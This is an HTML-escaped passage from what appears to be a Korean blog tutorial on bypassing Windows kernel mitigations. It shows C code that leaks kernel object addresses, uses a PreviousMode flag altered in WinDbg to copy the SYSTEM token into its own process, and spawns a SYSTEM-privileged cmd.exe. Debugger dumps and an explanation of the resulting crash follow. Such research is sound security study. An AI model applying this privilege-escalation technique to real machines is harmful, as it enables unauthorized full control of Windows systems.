&lt;li&gt;I/O Ring Buffer&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;del&gt;&amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC704; &amp;#xC138; &amp;#xAC00;&amp;#xC9C0; &amp;#xAE30;&amp;#xBC95;&amp;#xC744; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/del&gt; &amp;#xB9C8;&amp;#xAC10; &amp;#xC774;&amp;#xC288;&amp;#xB85C;,, &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; PreviouMode&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD55C; exploit&amp;#xB9CC; &amp;#xC18C;&amp;#xAC1C;&amp;#xD558;&amp;#xACE0;, &amp;#xB2E4;&amp;#xC74C; &amp;#xD30C;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; SeDebugPrivileges&amp;#xC640; I/O Ring Buffer&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD55C; Exploit&amp;#xC744; &amp;#xB2E4;&amp;#xB904;&amp;#xBCF4;&amp;#xB3C4;&amp;#xB85D; &amp;#xD560;&amp;#xAC8C;&amp;#xC694;!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%204.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;EXP-1-PreviousMode&#34;&gt;&lt;a href=&#34;#EXP-1-PreviousMode&#34; class=&#34;headerlink&#34; title=&#34;EXP 1 - PreviousMode&#34;&gt;&lt;/a&gt;EXP 1 - PreviousMode&lt;/h2&gt;&lt;p&gt;&amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8;&amp;#xB294; PreviousMode &amp;#xBCC0;&amp;#xC870;&amp;#xB97C; &amp;#xC774;&amp;#xC6A9;&amp;#xD55C; &amp;#xBC29;&amp;#xBC95;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/ko-kr/windows-hardware/drivers/kernel/previousmode&#34;&gt;PreviousMode&lt;/a&gt;&amp;#xB294; KTHREAD &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4; &amp;#xD544;&amp;#xB4DC;&amp;#xB85C;, &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xC560;&amp;#xD50C;&amp;#xB9AC;&amp;#xCF00;&amp;#xC774;&amp;#xC158;&amp;#xC774; &lt;strong&gt;Nt&lt;/strong&gt; &amp;#xB610;&amp;#xB294; &lt;strong&gt;Zw&lt;/strong&gt; &amp;#xBC84;&amp;#xC804;&amp;#xC758; &amp;#xB124;&amp;#xC774;&amp;#xD2F0;&amp;#xBE0C; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4; &amp;#xB8E8;&amp;#xD2F4;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xACBD;&amp;#xC6B0; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC;&amp;#xC758; &amp;#xB9E4;&amp;#xAC1C;&amp;#xBCC0;&amp;#xC218;&amp;#xAC00; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC654;&amp;#xC74C;&amp;#xC744; &amp;#xC54C;&amp;#xB9AC;&amp;#xB294; &amp;#xD50C;&amp;#xB798;&amp;#xADF8; &amp;#xAC12;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. PreviousMode &amp;#xAC12;&amp;#xC774; 1&amp;#xC774;&amp;#xBA74; &amp;#xD604;&amp;#xC7AC; &amp;#xC2A4;&amp;#xB808;&amp;#xB4DC; &amp;#xAC1D;&amp;#xCCB4;&amp;#xAC00; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &amp;#xC0DD;&amp;#xC131;&amp;#xB418;&amp;#xC5C8;&amp;#xACE0;, 0&amp;#xC774;&amp;#xBA74; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC0DD;&amp;#xC131;&amp;#xB418;&amp;#xC5C8;&amp;#xC74C;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC8E0;. &amp;#xC774;&amp;#xB294; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xC628; &amp;#xAC1D;&amp;#xCCB4;&amp;#xC758; &amp;#xCEE4;&amp;#xB110; &amp;#xC811;&amp;#xADFC;&amp;#xC744; &amp;#xC81C;&amp;#xD55C;&amp;#xD558;&amp;#xB294; &amp;#xC5ED;&amp;#xD560;&amp;#xC744; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; PrevousMode&amp;#xB97C; 0&amp;#xC73C;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC73C;&amp;#xBA74; &lt;code&gt;NtWriteVirtualMemory&lt;/code&gt;&amp;#xB098; &lt;code&gt;ReadProcessMemory&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD574; &amp;#xCEE4;&amp;#xB110; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; RW &amp;#xD504;&amp;#xB9AC;&amp;#xBBF8;&amp;#xD2F0;&amp;#xBE0C;&amp;#xB97C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;, &amp;#xC774;&amp;#xD574;&amp;#xB97C; &amp;#xB3D5;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xAC04;&amp;#xB2E8;&amp;#xD55C; &amp;#xC608;&amp;#xC81C;&amp;#xC640; &amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC54C;&amp;#xC544;&amp;#xBCFC;&amp;#xAC8C;&amp;#xC694;!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;defines.h&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; STATUS_INFO_LENGTH_MISMATCH 0xc0000004&lt;/span&gt;

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtFsControlFile pNtFsControlFile;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;GetNtFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{...}
&lt;span class=&#34;hljs-function&#34;&gt;PVOID &lt;span class=&#34;hljs-title&#34;&gt;GetObj&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(PULONGLONG objptr, ULONG pid, HANDLE handle)&lt;/span&gt;&lt;/span&gt;{...}

&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;{
	PVOID KTHREAD = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID SYSTEM_EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;
	PVOID EPROCESS = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

	ULONG dwbytes = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();
	
	&lt;span class=&#34;hljs-comment&#34;&gt;// [1]&lt;/span&gt;
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&amp;amp;KTHREAD, pid, hThread);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current KTHREAD: %p\n&amp;quot;&lt;/span&gt;, KTHREAD);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&amp;amp;EPROCESS, pid, hProc);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] Current EPROCESS: %p\n&amp;quot;&lt;/span&gt;, EPROCESS);

	GetObj(&amp;amp;SYSTEM_EPROCESS, &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;, (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;);
	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] System EPROCESS: %p\n&amp;quot;&lt;/span&gt;, SYSTEM_EPROCESS);

	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;modify previousmode in windbg and press any button..\n&amp;quot;&lt;/span&gt;);
	getch();

	&lt;span class=&#34;hljs-comment&#34;&gt;// [2]&lt;/span&gt;
	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt; , (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);

	&lt;span class=&#34;hljs-comment&#34;&gt;// [3]&lt;/span&gt;
	system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;);
	
}&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xC804;&amp;#xCCB4; &amp;#xC18C;&amp;#xC2A4;&amp;#xCF54;&amp;#xB4DC; : &lt;a href=&#34;https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c&#34;&gt;https://github.com/hackyboiz/kcfg-bypass/blob/main/example-with-windbg.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xB3D9;&amp;#xC791;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;NtQuerySystemInformation&lt;/code&gt; API&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD544;&amp;#xC694;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C; leak &lt;/li&gt;
&lt;li&gt;&amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xD1A0;&amp;#xD070;&amp;#xAC12;&amp;#xC744; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB85C; overwrite&lt;/li&gt;
&lt;li&gt;&amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xAD8C;&amp;#xD55C;&amp;#xC758; cmd &amp;#xC2A4;&amp;#xD3F0;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xC815;&amp;#xC0C1;&amp;#xC801;&amp;#xC778; &amp;#xC2E4;&amp;#xD589;&amp;#xC774;&amp;#xB77C;&amp;#xBA74; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB294; &lt;code&gt;pNtWriteVirtualMemory&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xCEE4;&amp;#xB110; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; RW&amp;#xAC00; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;&amp;#xD558;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC544;&amp;#xBB34; &amp;#xC77C;&amp;#xB3C4; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;..&amp;#xB9CC;! &amp;#xC6B0;&amp;#xB9B0; &amp;#xC774;&amp;#xC81C; &lt;code&gt;pNtWriteVirtualMemory&lt;/code&gt;&amp;#xD638;&amp;#xCD9C; &amp;#xC804; &amp;#xB514;&amp;#xBC84;&amp;#xAC70;&amp;#xC5D0;&amp;#xC11C; PreviouMode&amp;#xB97C; &amp;#xC218;&amp;#xC815;&amp;#xD558;&amp;#xACE0; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; &amp;#xD560;&amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xD604;&amp;#xC7AC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; KTHREAD/EPROCESS &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; SYSTEM &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; EPROCESS &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xCD9C;&amp;#xB825;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xAC78; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD574;&amp;#xB450;&amp;#xACE0; windbg&amp;#xB85C; &amp;#xAC11;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;: kd&amp;gt; dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; Header           : _DISPATCHER_HEADER
   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; SListFaultAddress : (null) 
   +&lt;span class=&#34;hljs-number&#34;&gt;0x020&lt;/span&gt; QuantumTarget    : &lt;span class=&#34;hljs-number&#34;&gt;0x8ad5b1e&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x028&lt;/span&gt; InitialStack     : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c30 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x030&lt;/span&gt; StackLimit       : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;1000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x038&lt;/span&gt; StackBase        : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;8000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; ThreadLock       : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x048&lt;/span&gt; CycleTime        : &lt;span class=&#34;hljs-number&#34;&gt;0x4bf645c&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x050&lt;/span&gt; CurrentRunTime   : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x054&lt;/span&gt; ExpectedRunTime  : &lt;span class=&#34;hljs-number&#34;&gt;0xbe0b&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x058&lt;/span&gt; KernelStack      : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x060&lt;/span&gt; StateSaveArea    : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c80 _XSAVE_FORMAT
...
   +&lt;span class=&#34;hljs-number&#34;&gt;0x220&lt;/span&gt; Process          : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c39640c0 _KPROCESS
   +&lt;span class=&#34;hljs-number&#34;&gt;0x228&lt;/span&gt; UserAffinity     : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c3780a68 _KAFFINITY_EX
   +&lt;span class=&#34;hljs-number&#34;&gt;0x230&lt;/span&gt; UserAffinityPrimaryGroup : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt; PreviousMode     : &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
   +0x233 BasePriority     : 8 &amp;apos;&amp;apos;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%206.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;KTHREAD+0x232&lt;/code&gt; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; PreviouMode&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD604;&amp;#xC7AC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB294; &amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC;&amp;#xC774;&amp;#xB2C8; PreviouMode&amp;#xAC00; 1&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB124;&amp;#xC694;. &amp;#xC774;&amp;#xC81C; windbg&amp;#xC758; Memory &amp;#xCC3D;&amp;#xC5D0;&amp;#xC11C; &amp;#xD574;&amp;#xB2F9; &amp;#xAC12;&amp;#xC744; 0&amp;#xC73C;&amp;#xB85C; &amp;#xC218;&amp;#xC815;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;: kd&amp;gt; dt _KTHREAD FFFFDC0FC3780080
nt!_KTHREAD
   +&lt;span class=&#34;hljs-number&#34;&gt;0x000&lt;/span&gt; Header           : _DISPATCHER_HEADER
   +&lt;span class=&#34;hljs-number&#34;&gt;0x018&lt;/span&gt; SListFaultAddress : (null) 
   +&lt;span class=&#34;hljs-number&#34;&gt;0x020&lt;/span&gt; QuantumTarget    : &lt;span class=&#34;hljs-number&#34;&gt;0x8ad5b1e&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x028&lt;/span&gt; InitialStack     : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c30 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x030&lt;/span&gt; StackLimit       : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;1000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x038&lt;/span&gt; StackBase        : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;8000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x040&lt;/span&gt; ThreadLock       : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x048&lt;/span&gt; CycleTime        : &lt;span class=&#34;hljs-number&#34;&gt;0x4bf645c&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x050&lt;/span&gt; CurrentRunTime   : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x054&lt;/span&gt; ExpectedRunTime  : &lt;span class=&#34;hljs-number&#34;&gt;0xbe0b&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x058&lt;/span&gt; KernelStack      : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7000 Void
   +&lt;span class=&#34;hljs-number&#34;&gt;0x060&lt;/span&gt; StateSaveArea    : &lt;span class=&#34;hljs-number&#34;&gt;0xfffff500&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;166f&lt;/span&gt;7c80 _XSAVE_FORMAT
...
   +&lt;span class=&#34;hljs-number&#34;&gt;0x220&lt;/span&gt; Process          : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c39640c0 _KPROCESS
   +&lt;span class=&#34;hljs-number&#34;&gt;0x228&lt;/span&gt; UserAffinity     : &lt;span class=&#34;hljs-number&#34;&gt;0xffffdc0f&lt;/span&gt;`c3780a68 _KAFFINITY_EX
   +&lt;span class=&#34;hljs-number&#34;&gt;0x230&lt;/span&gt; UserAffinityPrimaryGroup : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;
   +&lt;span class=&#34;hljs-number&#34;&gt;0x232&lt;/span&gt; PreviousMode     : &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;&amp;apos;&lt;/span&gt;
   +0x233 BasePriority     : 8 &amp;apos;&amp;apos;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB2E4;&amp;#xC2DC; &amp;#xBD84;&amp;#xC11D; &amp;#xBA38;&amp;#xC2E0;&amp;#xC73C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC640; &amp;#xC544;&amp;#xBB34; &amp;#xBC84;&amp;#xD2BC;&amp;#xC774;&amp;#xB098; &amp;#xB204;&amp;#xB974;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C; &amp;#xC2A4;&amp;#xD15D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt; , (ULONGLONG)SYSTEM_EPROCESS + &lt;span class=&#34;hljs-number&#34;&gt;0x4b8&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(ULONGLONG), &amp;amp;dwbytes);
system(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;PreviousMode &amp;#xBCC0;&amp;#xC870;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;pNtWritevirtualMemory&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &amp;#xCEE4;&amp;#xB110; Read/Write&amp;#xAC00; &amp;#xAC00;&amp;#xB2A5;&amp;#xD574;&amp;#xC84C;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; EPROCESS&amp;#xC758; Token&amp;#xC73C;&amp;#xB85C; Token Swapping&amp;#xC744; &amp;#xD55C; &amp;#xB4A4; cmd &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; NT AUTORITY\SYSTEM &amp;#xAD8C;&amp;#xD55C;&amp;#xC758; cmd&amp;#xAC00;&amp;#x2026;!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%208.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/image%209.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;BSOD&amp;#xAC00; &amp;#xB5A0;&amp;#xBC84;&amp;#xB838;&amp;#xB124;&amp;#xC694;.. ??&lt;/p&gt;
&lt;p&gt;&amp;#xBB38;&amp;#xC81C;&amp;#xB294; PreviousMode&amp;#xB97C; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD55C; &amp;#xB4A4; &amp;#xC2DC;&amp;#xC2A4;&amp;#xD15C; &amp;#xAD8C;&amp;#xD55C;&amp;#xC73C;&amp;#xB85C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD558;&amp;#xB824;&amp;#xACE0; &amp;#xD560; &amp;#xB54C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Token Swapping&amp;#xC744; &amp;#xD55C; &amp;#xC774;&amp;#xD6C4;&amp;#xC5D0;&amp;#xB294; &amp;#xCEE4;&amp;#xB110;&amp;#xBAA8;&amp;#xB4DC; PreviousMode&amp;#xAC00; &amp;#xD544;&amp;#xC694; &amp;#xC5C6;&amp;#xC73C;&amp;#xB2C8; cmd &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xC0DD;&amp;#xC131; &amp;#xC804;&amp;#xC5D0; &amp;#xC6D0;&amp;#xB798; &amp;#xAC12;&amp;#xC778; 1&amp;#xB85C; &amp;#xBCF5;&amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xACFC;&amp;#xC815;&amp;#xC774; &amp;#xC788;&amp;#xC5B4;&amp;#xC57C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC0DD;&amp;#xC131;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
